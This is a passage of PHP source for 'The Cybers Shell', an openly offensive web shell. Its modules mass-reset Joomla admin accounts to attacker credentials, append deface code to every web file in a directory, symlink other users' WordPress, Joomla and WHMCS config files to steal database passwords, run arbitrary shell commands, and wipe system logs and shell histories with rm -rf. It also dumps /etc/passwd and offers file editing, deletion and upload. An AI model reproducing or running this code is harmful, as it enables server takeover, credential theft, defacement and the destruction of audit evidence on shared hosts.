$pass    =  ex($readconfig,'$password = \'',"';");
$userdb  =  ex($readconfig,'$user = \'',"';");
$db      =  ex($readconfig,'$db = \'',"';");
$fix     =  ex($readconfig,'$dbprefix = \'',"';");
$tab     =  $fix.'users';
$con     = @mysql_connect('localhost',$userdb,$pass);
$db      = @mysql_select_db($db,$con);
$query   = @mysql_query("UPDATE `$tab`  SET `username` ='virusa'");
$query3  = @mysql_query("UPDATE `$tab`  SET `password` ='0a3329119bf465dce95057a37ec91152:TL1fIDogLJU4bHHcgQWETu8GN67fUd8'");
if ($query and $query3 ){$r = '<b style="color: #ee5500">Succeed </b>user [virusa] pass [worm]</b>';}else{$r = '<b style="color:red">failed</b>';}
$domins = trim($domin).'';
echo "<tr>
<td><div class='cone'><a target='_blank' href='http://$domins'>$domin</a></div></td>
<td><div class='cone'><a target='_blank' href='$config'>config</a></td><td>".$r."</td></div></tr>";
flush();

}else{

echo "<tr>
<td><div class='cone'><a target='_blank' href='http://$domins'>$domin</a></div></td>
<td><div class='cone'><a target='_blank' href='http://$exp'>config</a></div></td><td><b style='color:red'>failed</b></td></tr>";
flush();

}
}

die();

}

if(!is_file('named.txt')){

$d00m = @file("/etc/named.conf");

flush();

}else{

$d00m = file("named.txt");

}
if(!$d00m)
{
die ("<meta http-equiv='refresh' content='0; url=?action=read'/>");
}
else
{
echo "<br><div class='tmp'>
<form method='POST' action='$pg?action=joomla'>
<input type='submit' value='Mass change Admin' />
<input type='hidden' value='1' name='s' />
</form><br>
<table align='center' width='40%'><td> <font color='#e4e4e4'><b>Domains </b></font></td><td> <font color='#e4e4e4'><b>Config </b></font></td><td> <font color='#e4e4e4'><b>Result </b></font></td>";

$f = fopen('joomla.txt','w');

foreach($d00m as $dom){

if(eregi("zone",$dom)){

preg_match_all('#zone "(.*)"#', $dom, $domvw);

if(strlen(trim($domvw[1][0])) > 2){

$user = posix_getpwuid(@fileowner("/etc/valiases/".$domvw[1][0]));


$wpl=$pageURL."/sim/rut/home/".$user['name']."/public_html/configuration.php";
$wpp=get_headers($wpl);
$wp=$wpp[0];

$wp2=$pageURL."/sim/rut/home/".$user['name']."/public_html/blog/configuration.php";
$wpp2=get_headers($wp2);
$wp12=$wpp2[0];

$wp3=$pageURL."/sim/rut/home/".$user['name']."/public_html/joomla/configuration.php";
$wpp3=get_headers($wp3);
$wp13=$wpp3[0];


$pos = strpos($wp, "200");
$config="&nbsp;";

if (strpos($wp, "200") == true )
{
 $config= $wpl;
}
elseif (strpos($wp12, "200") == true)
{
  $config= $wp2;
}
elseif (strpos($wp13, "200") == true)
{
  $config= $wp3;
}
else
{
continue;

}
flush();

$dom = $domvw[1][0];

$w = fwrite($f,"$config||$dom \n");
if($w){$r = '<b>Save</b>';}else{$r = '<b style="color:red">failed</b>';}

echo "<tr><td><div class='cone'><a href=http://www.".$domvw[1][0].">".$domvw[1][0]."</a></div></td>
<td><div class='cone'><a href='$config'>config</a></div></td><td>".$r."</td></tr>";

flush();

}
}
}
}
echo "</table></div><br><br>";
}

// Mass Deface

if(isset($_GET['action']) && $_GET['action'] == 'mass'){
echo '<center><b class="conte">
<a href="?action=mass">Mass Deface Dirs</a> -
<a href="?action=joomla">Mass Change Admin Joomla</a> -
<a href="?action=vb">Mass Change Admin vBulletin</a> -
<a href="?action=wp">Mass Change Admin WordPress</a> -
<a href="?action=wpandjmlamassdfce">Wordpress & Joomla Mass Deface</a> -
<a href="?action=wrdprshtmlinj">Wordpress Index Hijack Priv8</a> -
<a href="?action=cpnlndftpotdfr">Cpanel & Ftp Auto Defacer</a> </center>
</b>';
if(!isset($_GET['code'])){

?>

<?php
echo '<br><br><center><span style="font-size:30px; font-family:Fredericka the Great">Mass Deface Dirs</span><br><form action="" method="get">
<center><br>Mass deface script, php/html/htm/asp/aspx/js</center><br><input type="hidden" name="action" value="mass">
<textarea name="code" id="source">YOUR DEFACE PAGE HERE =)</textarea><br><br>
<font>Folder:</font> <input type="text" value="'.getcwd().'" name="dir" style="border-top:none;"> <input type="submit" value="Execute" style="border-top:none;"></center>
</form>';
}
else{

if (is_dir($_GET['dir'])) {
$lolinject = $_GET['code'];
foreach (glob($_GET['dir']."/*.php") as $injectj00) {
$fp=fopen($injectj00,"a+");
if (fputs($fp,$lolinject)){
echo $injectj00.' was injected<br>';
} else {
echo '<font color=red>failed to inject '.$injectj00.'</font>';
}
}
foreach (glob($_GET['dir']."/*.html") as $injectj00) {
$fp=fopen($injectj00,"a+");
if (fputs($fp,$lolinject)){
echo $injectj00.' was injected<br>';
} else {
echo '<font color=red>failed to inject '.$injectj00.'</font>';
}
}
foreach (glob($_GET['dir']."/*.htm") as $injectj00) {
$fp=fopen($injectj00,"a+");
if (fputs($fp,$lolinject)){
echo $injectj00.' was injected<br>';
} else {
echo '<font color=red>failed to inject '.$injectj00.'</font>';
}
}
foreach (glob($_GET['dir']."/*.asp") as $injectj00) {
$fp=fopen($injectj00,"a+");
if (fputs($fp,$lolinject)){
echo $injectj00.' was injected<br>';
} else {
echo '<font color=red>failed to inject '.$injectj00.'</font>';
}
}
foreach (glob($_GET['dir']."/*.js") as $injectj00) {
$fp=fopen($injectj00,"a+");
if (fputs($fp,$lolinject)){
echo $injectj00.' was injected<br>';
} else {
echo '<font color=red>failed to inject '.$injectj00.'</font>';
}
}
foreach (glob($_GET['dir']."/*.aspx") as $injectj00) {
$fp=fopen($injectj00,"a+");
if (fputs($fp,$lolinject)){
echo $injectj00.' was injected<br>';
} else {
echo '<font color=red>failed to inject '.$injectj00.'</font>';
}
}
} else { //end if inputted dir is real -- if not, show an ugly red error
echo '<b><font color=red>'.$_GET['pathtomass'].' is not available!</font></b>';
} // end if inputted dir is real, for real this time
}
}


// NAVEGAÇÃO

function permissao($arquivo){
		$perms = fileperms($arquivo);
		if(($perms&0xC000)==0xC000)$info='s';
		elseif(($perms&0xA000)==0xA000)$info='l';
		elseif(($perms&0x8000)==0x8000)$info='-';
		elseif(($perms&0x6000)==0x6000)$info='b';
		elseif(($perms&0x4000)==0x4000)$info='d';
		elseif(($perms&0x2000)==0x2000)$info='c';
		elseif(($perms&0x1000)==0x1000)$info='p';
		else $info='u';
		$info.=($perms&0x0100)?'r':'-';
		$info.=($perms&0x0080)?'w':'-';
		$info.=($perms&0x0040)?(($perms&0x0800)?'s':'x'):(($perms&0x0800)?'S':'-');
		$info.=($perms&0x0020)?'r':'-';
		$info.=($perms&0x0010)?'w':'-';
		$info.=($perms&0x0008)?(($perms&0x0400)?'s':'x'):(($perms&0x0400)?'S':'-');
		$info.=($perms&0x0004)?'r':'-';
		$info.=($perms&0x0002)?'w':'-';
		$info.=($perms&0x0001)?(($perms&0x0200)?'t':'x'):(($perms&0x0200)?'T':'-');
		return $info;
	}
	function anterior($dir){
		$dir = explode("/",$dir);
		unset($dir[count($dir)-1]);
		if($dir[1] == ""){
			$dir[0] = "/";
		}
		return implode("/",$dir);
	}
	function listar($dir){
		$anterior = anterior($dir);
	echo "
			<table>
				<tr>
					<small>Navegação</small>
				</tr>
		";
		echo "
			<table>
				<tr>
					<th>Arquivo</th>
					<th>Permissão</th>
					<th>Tamanho</th>
					<th>Abrir</th>
					<th>Download</th>
					<th>Renomear</th>
					<th>Editar</th>
					<th>Excluir</th>
				</tr>
		";
		foreach(scandir($dir) as $nome){
			$file = "$dir/$nome";
			if($nome ==".."){
				echo "<tr>";
				echo "<td><a href=?ls=$anterior>..</a></td>";
				echo "<td></td>";
				echo "<td></td>";
				echo "<td></td>";
				echo "<td></td>";
				echo "<td></td>";
				echo "<td></td>";
				echo "<td></td>";
				echo "</tr>";	
			}
			if(!is_file($file) and $nome != ".." and $nome != "."){
				echo "<tr>";
				echo "<td><a href=?ls=$file>$nome</a></td>";
				echo "<td>".permissao("$dir/$nome")."</td>";
				echo "<td></td>";
				echo "<td></td>";
				echo "<td></td>";
				echo "<td></td>";
				echo "<td></td>";
				echo "<td></td>";
				echo "</tr>";
			}
			if($nome != "." && $nome !=".." && is_file($file)){
				echo "<tr>";	
				echo "<td>".$nome."</td>";
				echo "<td>".permissao("$dir/$nome")."</td>";
				echo "<td>".filesize($file)." bytes</td>";
				echo "<td><a href='#'>Visualizar</a></td>";
				echo "<td><a href='?download=$file'>Download</a></td>";
				echo "<td><a href='?renomear=$nome&pasta=$dir'>Renomear</a></td>";
				echo "<td><a href='?editar=$file'>Editar</a></td>";
				echo "<td><a href='?deletar=$file'>Deletar</a></td>";
				echo "</tr>";
			}
		}
		echo "</table>";
	}




// CONFIG GRABBER

if(isset($_GET['action']) && $_GET['action'] == 'vgrab'){
echo '<center><b class="conte">
<a href="?action=vgrab">Config Grabber</a> -
</center>
</b>';
echo "<br><br><br><center><span style='font-size:20px; font-family:Fredericka the Great'>Config Grabber</span>";?></center><br><center><?php if (empty($_POST['config'])) { ?><p><font face="Tahoma" size="2pt">/etc/passwd content</p><br><form method="POST"><textarea name="passwd" class='area' rows='15' cols='60'><?php echo file_get_contents('/etc/passwd'); ?></textarea><br><br><input name="config" class='inputzbut' size="100" value="PWNED" type="submit"><br></form></center><br><?php }if ($_POST['config']) {$function = $functions=@ini_get("disable_functions");if(eregi("symlink",$functions)){die ('<error>Symlink is disabled :( </error>');}@mkdir('vwconfig', 0755);@chdir('vwconfig');
$htaccess="
OPTIONS Indexes FollowSymLinks SymLinksIfOwnerMatch Includes IncludesNOEXEC ExecCGI
Options Indexes FollowSymLinks
ForceType text/plain
AddType text/plain .php 
AddType text/plain .html
AddType text/html .shtml
AddType txt .php
AddHandler server-parsed .php
AddHandler txt .php
AddHandler txt .html
AddHandler txt .shtml
Options All
Options All";
file_put_contents(".htaccess",$htaccess,FILE_APPEND);$passwd=$_POST["passwd"];$passwd=explode("\n",$passwd);echo "<br><br><center><font color=#b0b000 size=2pt>wait ...</center><br>";foreach($passwd as $pwd){$pawd=explode(":",$pwd);$user =$pawd[0];@symlink('/home/'.$user.'/public_html/wp-config.php',$user.'-wp13.txt');@symlink('/home/'.$user.'/public_html/wp/wp-config.php',$user.'-wp13-wp.txt');@symlink('/home/'.$user.'/public_html/WP/wp-config.php',$user.'-wp13-WP.txt');@symlink('/home/'.$user.'/public_html/wp/beta/wp-config.php',$user.'-wp13-wp-beta.txt');@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-wp13-beta.txt');@symlink('/home/'.$user.'/public_html/press/wp-config.php',$user.'-wp13-press.txt');@symlink('/home/'.$user.'/public_html/wordpress/wp-config.php',$user.'-wp13-wordpress.txt');@symlink('/home/'.$user.'/public_html/Wordpress/wp-config.php',$user.'-wp13-Wordpress.txt');@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-wp13-Wordpress.txt');@symlink('/home/'.$user.'/public_html/config.php',$user.'-configgg.txt');@symlink('/home/'.$user.'/public_html/news/wp-config.php',$user.'-wp13-news.txt');@symlink('/home/'.$user.'/public_html/new/wp-config.php',$user.'-wp13-new.txt');@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-wp-blog.txt');@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-wp-beta.txt');@symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$user.'-wp-blogs.txt');@symlink('/home/'.$user.'/public_html/home/wp-config.php',$user.'-wp-home.txt');@symlink('/home/'.$user.'/public_html/db.php',$user.'-dbconf.txt');@symlink('/home/'.$user.'/public_html/site/wp-config.php',$user.'-wp-site.txt');@symlink('/home/'.$user.'/public_html/main/wp-config.php',$user.'-wp-main.txt');@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-wp-test.txt');@symlink('/home/'.$user.'/public_html/joomla/configuration.php',$user.'-joomla2.txt');@symlink('/home/'.$user.'/public_html/portal/configuration.php',$user.'-joomla-protal.txt');@symlink('/home/'.$user.'/public_html/joo/configuration.php',$user.'-joo.txt');@symlink('/home/'.$user.'/public_html/cms/configuration.php',$user.'-joomla-cms.txt');@symlink('/home/'.$user.'/public_html/site/configuration.php',$user.'-joomla-site.txt');@symlink('/home/'.$user.'/public_html/main/configuration.php',$user.'-joomla-main.txt');@symlink('/home/'.$user.'/public_html/news/configuration.php',$user.'-joomla-news.txt');@symlink('/home/'.$user.'/public_html/new/configuration.php',$user.'-joomla-new.txt');@symlink('/home/'.$user.'/public_html/home/configuration.php',$user.'-joomla-home.txt');@symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'-vb-config.txt');@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-whm15.txt');@symlink('/home/'.$user.'/public_html/central/configuration.php',$user.'-whm-central.txt');@symlink('/home/'.$user.'/public_html/whm/whmcs/configuration.php',$user.'-whm-whmcs.txt');@symlink('/home/'.$user.'/public_html/whm/WHMCS/configuration.php',$user.'-whm-WHMCS.txt');@symlink('/home/'.$user.'/public_html/whmc/WHM/configuration.php',$user.'-whmc-WHM.txt');@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-whmcs.txt');@symlink('/home/'.$user.'/public_html/support/configuration.php',$user.'-support.txt');@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-joomla.txt');@symlink('/home/'.$user.'/public_html/submitticket.php',$user.'-whmcs2.txt');@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-whm.txt');}echo '<b class="cone"><font face="Tahoma" size="2pt"><b>Done -></b> <a target="_blank" href="vwconfig">Open configs</a></font></b>';}
}

// FIND FILE WRITABLE

if(isset($_GET['action']) && $_GET['action'] == 'cari'){
echo '<center><b class="conte">
<a href="?action=cari">Find Directory Writable/Readable</a> -
</center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Find Directory Writable/Readable</span></center><br><br>'.$end; function read_dir($path) { global $count; if ($handle = opendir($path)) { while (false !== ($file = readdir($handle))) { $dr="$path$file/"; if (($file!='.') and ($file!='..') and is_dir($dr)) { if (is_readable($dr) and is_writeable($dr)) { echo "[RW] " . $dr . "<br>\n\r"; $count++; } read_dir($dr); }}}} $count=0; set_time_limit(0); @$passwd=fopen('/etc/passwd','r'); if (!$passwd) { echo "<br><center><font color='#ff0000' size='2pt' />[-] No Access to /etc/passwd\n\r</center>"; exit;} $path_to_public=array(); echo "<html><center><table style='margin: 0 auto;'><tr valign='top'><td align='left'><font color='#007700' size='2pt' />\n\r"; while(!feof($passwd)) { $str=fgets($passwd); $pos=strpos($str,":"); $username=substr($str,0,$pos); $dirz="/home/$username/public_html/"; if (($username!="")) { if (is_readable($dirz)) { array_push($path_to_public,$dirz); if (is_writeable($dirz)) { $count++; echo "<font color=white>[</font><font color=yellow>R</font><font color=green>W</font><font color=white>]</font> " . $dirz . "<br><br><br>\n\r";} else echo "<font color=white>[</font><font color=yellow>R</font><font color=white>]</font> " . $dirz . "<br>\n\r"; }}} echo "<br><br><font color=white size=2pt>[+]</font> <font color=#00dd00 size=2pt>Found </font><font color=yellow size=2pt>" . sizeof($path_to_public) . "</font> <font color=#00dd00 size=2pt>readable public_html directories.</font><br><br>\n\r\n\r"; if (sizeof($path_to_public) != '0') { foreach ($path_to_public as $path) { } echo "<font color=white size=2pt>[+]</font> <font color=#00dd00 size=2pt>Found</font><font color=yellow size=2pt> " . $count . " </font><font color=#00dd00 size=2pt>writable directories.</font>\n\r"; echo "</td></tr></table></center></html>";
}

}


// COMMAND EXECUTE

if(isset($_GET['action']) && $_GET['action'] == 'cmd'){
echo '<center><b class="conte">
<a href="?action=cmd">Command Execution</a> -
</center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Command Execution</span><center><br>';
echo '
<form method=get action="'.$me.'">
<p>
<textarea class="area" rows="17" name="S1" cols="70" >';
if (strlen($_GET['command'])>1 && $_GET['execmethod']!="popen"){
echo $_GET['execmethod']($_GET['command']);}
if (strlen($_POST['command'])>1 && $_POST['execmethod']!="popen"){
echo $_POST['execmethod']($_POST['command']);}

if (strlen($_GET['command'])>1 && $_GET['execmethod']=="popen"){
popen($_GET['command'],"r");}

echo'</textarea></p><br><p align="center">
<input type=hidden name="vw" size="50" value="cmd"> <input type="text" name="command" size="43"> <select name=execmethod>
  <option value="system">System</option>  <option value="exec">Exec</option>  <option value="passthru">Passthru</option><option value="popen">popen</option>
</select> <input type="submit" value="Execute">
</p></form>';

}




// ABOUT

if(isset($_GET['action']) && $_GET['action'] == 'about'){
echo '
<br><center><img src="http://i.imgur.com/50bOEFV.png"><br></center><center>
<span style="font-size:30px; font-family:Fredericka the Great; color:#FF0000">The Cybers Shell - 2016</span><br><br><font color="#808080" size="1pt">Created by </font><font  color="#FF0000" size="1pt">Offset And JonatasFil</font> <font color="#FF0000" size="1pt">-</font> <font color="#FF0000" size="1pt">TheCybersTEAM</font><br><br><br>
<center><div class="logindiv"><table cellpadding="7" cellspacing="2">
<center><br><iframe src="https://www.facebook.com/plugins/like.php?href=https://www.facebook.com/TheCybersTeam&amp;send=false&amp;layout=standard&amp;width=400&amp;show_faces=false&amp;action=like&amp;colorscheme=light&amp;font=arial&amp;height=35" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:350px; height:20px;" allowTransparency="true"></iframe></center></table></div></center><br></center>
';
}


// SERVER INFORMATIONS

if(isset($_GET['action']) && $_GET['action'] == 'srvrinformations'){
echo '<center><b class="conte">
<a href="?action=srvrinformations">Server Informations</a>  </center>
</b>';
echo "<br><center><span style='font-size:30px; font-family:Fredericka the Great; color:#009900'>Server Security Informations</span><center><br>";
echo "<center><div class='tmpe'>
<table align='center' width='50%'><td><font color='#007700'>Kernel Version</font></td><td>";echo php_uname();
echo "<tr><td><font color='#007700'>Web Server</font></td><td>";echo $_SERVER["SERVER_SOFTWARE"];
echo "<tr><td><font color='#007700'>PHP Version</font></td><td>";echo phpversion(); echo " on "; echo php_sapi_name();
echo "<tr><td><font color='#007700'>Current User</font></td><td>";echo get_current_user();
echo "<tr><td><font color='#007700'>User ID</font></td><td>";echo getmyuid();
echo "<tr><td><font color='#007700'>Group</font></td><td>";echo getmygid();
echo "<tr><td><font color='#007700'>Cwd </font></td><td>";echo getcwd();
echo "<tr><td><font color='#007700'>Admin Server</font></td><td>";echo $_SERVER['SERVER_ADMIN'];
echo "<tr><td><font color='#007700'>Server Port</font></td><td>";echo $_SERVER['SERVER_PORT'];
echo "<tr><td><font color='#007700'>Server IP</font></td><td>";echo $serverIP = gethostbyname($_SERVER["HTTP_HOST"]);
echo "<tr><td><font color='#007700'>Client IP</font></td><td>";echo $_SERVER['REMOTE_ADDR'];
echo "<tr><td><font color='#007700'>cURL support</font></td><td>";echo function_exists('curl_version')?'Enabled':'No';
echo "<tr><td><font color='#007700'>Readable /etc/passwd</font></td><td>";echo @is_readable('/etc/passwd')?"Readable <a href='?action=moco'> [View]</a>":"Not Readable";
echo "<tr><td><font color='#007700'>Readable /etc/shadow</font></td><td>";echo @is_readable('/etc/shadow')?"Readable":"Not Readable";
$base = (ini_get("open_basedir") or strtoupper(ini_get("open_basedir"))=="ON")?"ON <font color='#007700'>secure</font>":"OFF <font color='#007700'>not secure</font>";
echo "<tr><td><font color='#007700'>Open Base Dir</font></td><td><font class=txt>" . $base . "</font>";
echo "</table></div></center><br>";
}


// IP LOOKUP DOMAIN

if(isset($_GET['action']) && $_GET['action'] == 'iplookdom'){

     echo "<center><span style='font-size:30px; font-family:Fredericka the Great; color:#009900'>Ip Lookup Reverse Domain</span></center>
";
echo "<center><img border='0' src='https://img.buzzfeed.com/buzzfeed-static/static/campaign_images/webdr01/2013/9/12/15/9-times-putin-pwned-obama-1-6849-1379013614-5_big.jpg' width=\"200\" height=\"200\" style='margin-top:10px'></center><div id=result>";
echo "<center><br><form><input type='text' size='60' value='yahoo.com' name='ghost' /><input type='hidden' name='action' value='iplookdom'> &nbsp;<input type='submit' value='&nbsp;&check;&nbsp;'></form></center>";
if(isset($_GET["ghost"]))
{
$site = $_GET["ghost"];
$ghost = "http://domains.yougetsignal.com/domains.php";

//Curl Function
$ch = curl_init($ghost);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$site&ket=");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_POST, 1);
$resp = curl_exec($ch);
$resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
$array = explode(",,", $resp);
unset($array[0]);
echo "<table style='margin: 0 auto'>";
foreach($array as $lnk)
{
    print "<tr><td><a  style=\"color:#0f0;font-weight:bold;\" href='$lnk' target=_blank>$lnk</a></td></tr>";
}
echo "</table>";
curl_close($ch);
}


}

// LOG REMOVE
if(isset($_GET['action']) && $_GET['action'] == 'deltlogss'){
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Logs Eraser</span><center><br>';
//remove log
echo "<table style='margin: 0 auto;'><tr valign='top'><td align='left'>";      
exec("rm -rf /tmp/logs");
exec("rm -rf /root/.ksh_history");
exec("rm -rf /root/.bash_history");
exec("rm -rf /root/.bash_logout");
exec("rm -rf /usr/local/apache/logs");
exec("rm -rf /usr/local/apache/log");
exec("rm -rf /var/apache/logs");
exec("rm -rf /var/apache/log");
exec("rm -rf /var/run/utmp");
exec("rm -rf /var/logs");
exec("rm -rf /var/log");
exec("rm -rf /var/adm");
exec("rm -rf /etc/wtmp");
exec("rm -rf /etc/utmp");
exec("rm -rf $HISTFILE");
exec("rm -rf /var/log/lastlog");
exec("rm -rf /var/log/wtmp");

//remove log
shell_exec("rm -rf /tmp/logs");
shell_exec("rm -rf /root/.ksh_history");
shell_exec("rm -rf /root/.bash_history");
shell_exec("rm -rf /root/.bash_logout");
shell_exec("rm -rf /usr/local/apache/logs");
shell_exec("rm -rf /usr/local/apache/log");
shell_exec("rm -rf /var/apache/logs");
shell_exec("rm -rf /var/apache/log");
shell_exec("rm -rf /var/run/utmp");
shell_exec("rm -rf /var/logs");
shell_exec("rm -rf /var/log");
shell_exec("rm -rf /var/adm");
shell_exec("rm -rf /etc/wtmp");
shell_exec("rm -rf /etc/utmp");
shell_exec("rm -rf $HISTFILE");
shell_exec("rm -rf /var/log/lastlog");
shell_exec("rm -rf /var/log/wtmp");

//temove log
passthru("rm -rf /tmp/logs");
passthru("rm -rf /root/.ksh_history");
passthru("rm -rf /root/.bash_history");
passthru("rm -rf /root/.bash_logout");
passthru("rm -rf /usr/local/apache/logs");
passthru("rm -rf /usr/local/apache/log");
passthru("rm -rf /var/apache/logs");
passthru("rm -rf /var/apache/log");
passthru("rm -rf /var/run/utmp");
passthru("rm -rf /var/logs");
passthru("rm -rf /var/log");
passthru("rm -rf /var/adm");
passthru("rm -rf /etc/wtmp");
passthru("rm -rf /etc/utmp");
passthru("rm -rf $HISTFILE");
passthru("rm -rf /var/log/lastlog");
passthru("rm -rf /var/log/wtmp");


//remove log
system("rm -rf /tmp/logs");
sleep(2);
echo'<br><font color="009900" face="Tahoma, Geneva, sans-serif" style="font-size: 10pt">Deleted [+].../tmp/logs <img src=http://rs717.pbsrc.com/albums/ww173/prestonjjrtr/Smileys/SmileyGreat.gif>';
sleep(2);

system("rm -rf /root/.bash_history");
sleep(2);
echo'<p>Deleted [+].../root/.bash_history <img src=http://rs717.pbsrc.com/albums/ww173/prestonjjrtr/Smileys/SmileyGreat.gif></p>';

system("rm -rf /root/.ksh_history");
sleep(2);
echo'<p>Deleted [+].../root/.ksh_history <img src=http://rs717.pbsrc.com/albums/ww173/prestonjjrtr/Smileys/SmileyGreat.gif></p>';

system("rm -rf /root/.bash_logout");
sleep(2);
echo'<p>Deleted [+].../root/.bash_logout <img src=http://rs717.pbsrc.com/albums/ww173/prestonjjrtr/Smileys/SmileyGreat.gif></p>';

system("rm -rf /usr/local/apache/logs");
sleep(2);
echo'<p>Deleted [+].../usr/local/apache/logs <img src=http://rs717.pbsrc.com/albums/ww173/prestonjjrtr/Smileys/SmileyGreat.gif></p>';

system("rm -rf /usr/local/apache/log");
sleep(2);
echo'<p>Deleted [+].../usr/local/apache/log <img src=http://rs717.pbsrc.com/albums/ww173/prestonjjrtr/Smileys/SmileyGreat.gif></p>';

system("rm -rf /var/apache/logs");
sleep(2);
echo'<p>Deleted [+].../var/apache/logs <img src=http://rs717.pbsrc.com/albums/ww173/prestonjjrtr/Smileys/SmileyGreat.gif></p>';

system("rm -rf /var/apache/log");
sleep(2);
echo'<p>Deleted [+].../var/apache/log <img src=http://rs717.pbsrc.com/albums/ww173/prestonjjrtr/Smileys/SmileyGreat.gif></p>';

system("rm -rf /var/run/utmp");
sleep(2);
echo'<p>Deleted [+].../var/run/utmp <img src=http://rs717.pbsrc.com/albums/ww173/prestonjjrtr/Smileys/SmileyGreat.gif></p>';

system("rm -rf /var/logs");
sleep(2);
echo'<p>Deleted [+].../var/logs <img src=http://rs717.pbsrc.com/albums/ww173/prestonjjrtr/Smileys/SmileyGreat.gif></p>';

system("rm -rf /var/log");
sleep(2);
echo'<p>Deleted [+].../var/log <img src=http://rs717.pbsrc.com/albums/ww173/prestonjjrtr/Smileys/SmileyGreat.gif></p>';

system("rm -rf /var/adm");
sleep(2);
echo'<p>Deleted [+].../var/adm <img src=http://rs717.pbsrc.com/albums/ww173/prestonjjrtr/Smileys/SmileyGreat.gif></p>';

system("rm -rf /etc/wtmp");
sleep(2);
echo'<p>Deleted [+].../etc/wtmp <img src=http://rs717.pbsrc.com/albums/ww173/prestonjjrtr/Smileys/SmileyGreat.gif></p>';

system("rm -rf /etc/utmp");
sleep(2);
echo'<p>Deleted [+].../etc/utmp <img src=http://rs717.pbsrc.com/albums/ww173/prestonjjrtr/Smileys/SmileyGreat.gif></p>';

system("rm -rf $HISTFILE");
sleep(2);
echo'<p>Deleted [+]...$HISTFILE <img src=http://rs717.pbsrc.com/albums/ww173/prestonjjrtr/Smileys/SmileyGreat.gif></p>'; 

system("rm -rf /var/log/lastlog");
sleep(2);
echo'<p>Deleted [+].../var/log/lastlog <img src=http://rs717.pbsrc.com/albums/ww173/prestonjjrtr/Smileys/SmileyGreat.gif></p>';

system("rm -rf /var/log/wtmp");
sleep(2);
echo'<p>Deleted [+].../var/log/wtmp <img src=http://rs717.pbsrc.com/albums/ww173/prestonjjrtr/Smileys/SmileyGreat.gif></p>';

sleep(4);

echo '</font><br><br><p><font color="00bb00" face="Tahoma, Geneva, sans-serif" style="font-size: 10pt">Log Apagado com sucesso !';
echo"</td></tr></table>";

}	

	function download($arquivo){
	    header('Content-Type: application/octet-stream');
	    header('Content-Length: '.filesize($arquivo));
	    header('Content-Disposition: filename='.$arquivo);
	    readfile($arquivo);
	    exit();
	}
	function editar($editar){
		echo "<form action=shell.php method=post>";
		$arq = file($editar);
		echo "<input name=arquivo type=hidden value='$editar'>";
		echo "<textarea name=salvar cols=100 rows=10>";
		foreach($arq as $linha){
			echo htmlspecialchars($linha);
		}
		echo "</textarea>";
		echo "<br />";
		echo "<input type=submit value=salvar>";
		echo "</form>";
		exit();
	}
	function salvar($dados, $arquivo){
		$fp = fopen($arquivo, "w");
		fwrite($fp,$dados);
		fclose($fp);
	}
	function deletar($arquivo){
		unlink($arquivo);
	}
	// POST e GET ==================================================
	if($salvar = $_POST['salvar'] and $arquivo = $_POST['arquivo']){
		salvar($salvar,$arquivo);
	}
	if($arquivo = $_GET['download']){
		download($arquivo);
	}
	if($editar = $_GET['editar']){
		editar($editar);
	}
	if($deletar = $_GET['deletar']){
		deletar($deletar);
	}
	// Shell =======================================================
	$diretorio = getcwd();
	listar($diretorio);

// Upload
echo '<center><form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader"></center>';
echo '<center><input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form></center>';
if ($_POST['_upl'] == "Upload") {
    if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
        echo 'Upload ok XD !!!';
    } else {
        echo 'Upload Fail !!!';
    }
}
?>
<br>
<center>
<?php echo php_uname();
?>
</center>

<br>
<br>
<br<
</center></span><footer id="ftr" style="left:0px; right:0px; bottom:0px; background:transparent); text-align:center;"><font color="#cccccc" size="1">&copy; TheCybers Shell 2016  | Coded by Offset And JonatasFil</font></footer>
</body>
</html>
